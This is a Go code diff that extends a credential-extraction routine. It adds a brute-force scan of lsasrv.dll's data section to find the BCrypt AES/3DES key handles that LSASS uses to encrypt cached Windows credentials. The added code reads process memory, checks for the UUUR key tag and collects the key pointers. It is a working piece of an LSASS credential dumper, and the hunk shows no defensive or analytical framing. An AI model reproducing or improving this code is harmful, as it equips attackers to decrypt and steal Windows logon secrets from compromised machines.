@@ -353,19 +353,68 @@ func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, 
 		}
 	}
 
-	// Always include hex dump for diagnostics when scanner is used
-	dumpStart := hit - 200
-	if dumpStart < 0 {
-		dumpStart = 0
+	// Pass 3: data section brute-force scan if instruction-based scan
+	// found < 2 keys. Scan the upper portion of lsasrv.dll for 8-byte
+	// aligned values that look like heap pointers to UUUR-tagged BCrypt
+	// key handles. This handles builds where the AES/3DES key globals
+	// are not referenced by any instruction near the signature.
+	if len(keyGlobals) < 2 && reader != nil {
+		dataStart := bufLen * 3 / 4
+		dataStart = dataStart &^ 7 // align to 8 bytes
+		for off := dataStart; off+8 <= bufLen; off += 8 {
+			if seen[off] {
+				continue
+			}
+			ptrVal := binary.LittleEndian.Uint64(lsasrvBytes[off : off+8])
+			handleAddr := uintptr(ptrVal)
+			if handleAddr == 0 || handleAddr < 0x10000 || handleAddr > 0x7FFFFFFFFFFF {
+				continue
+			}
+			handleBytes, err := reader.Read(handleAddr, uint32(bcryptHandleKeySize))
+			if err != nil || len(handleBytes) < bcryptHandleKeySize {
+				continue
+			}
+			tag := binary.LittleEndian.Uint32(handleBytes[bcryptHandleKeyTagOff : bcryptHandleKeyTagOff+4])
+			if tag != bcryptHandleKeyTagWant {
+				continue
+			}
+			isDup := false
+			for _, existing := range keyGlobals {
+				if existing.handlePtr == ptrVal {
+					isDup = true
+					break
+				}
+			}
+			if isDup {
+				continue
+			}
+			var bits uint32
+			keyAddr := uintptr(binary.LittleEndian.Uint64(handleBytes[bcryptHandleKeyKeyOff : bcryptHandleKeyKeyOff+8]))
+			if keyAddr != 0 && keyAddr >= 0x10000 {
+				key81Bytes, err := reader.Read(keyAddr, bcryptHardKeyDataOff)
+				if err == nil && len(key81Bytes) >= bcryptHardKeyDataOff {
+					bits = binary.LittleEndian.Uint32(key81Bytes[0x18:0x1C])
+				}
+			}
+			keyGlobals = append(keyGlobals, cryptoScanCandidate{off, off, ptrVal, bits})
+			if len(keyGlobals) >= 2 {
+				break
+			}
+		}
 	}
-	dumpEnd := hit + patLen + 50
-	if dumpEnd > bufLen {
-		dumpEnd = bufLen
-	}
-	hexDump := hex.EncodeToString(lsasrvBytes[dumpStart:hit])
-	hexPost := hex.EncodeToString(lsasrvBytes[hit:dumpEnd])
 
 	if len(keyGlobals) < 2 {
+		dumpStart := hit - 200
+		if dumpStart < 0 {
+			dumpStart = 0
+		}
+		dumpEnd := hit + patLen + 50
+		if dumpEnd > bufLen {
+			dumpEnd = bufLen
+		}
+		hexDump := hex.EncodeToString(lsasrvBytes[dumpStart:hit])
+		hexPost := hex.EncodeToString(lsasrvBytes[hit:dumpEnd])
+
 		var rejParts []string
 		for _, r := range rejected {
 			rejParts = append(rejParts, fmt.Sprintf("instr@%d→off=%d: %s", r.instrOff, r.targetOff, r.reason))
@@ -374,7 +423,7 @@ func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, 
 		if len(rejParts) > 0 {
 			rejStr = strings.Join(rejParts, "; ")
 		}
-		return lsaCryptoGlobals{}, fmt.Errorf("found %d distinct BCrypt key globals (need 2) scanning hit=%d (back 600, fwd 200); found=[%s]; rejected=[%s]; pre-pattern hex (200B): %s; pattern+post hex: %s",
+		return lsaCryptoGlobals{}, fmt.Errorf("found %d distinct BCrypt key globals (need 2) scanning hit=%d (back 600, fwd 200, data-section brute-force); found=[%s]; rejected=[%s]; pre-pattern hex (200B): %s; pattern+post hex: %s",
 			len(keyGlobals), hit, formatValidatedKeys(keyGlobals, lsasrvBase), rejStr, hexDump, hexPost)
 	}
 
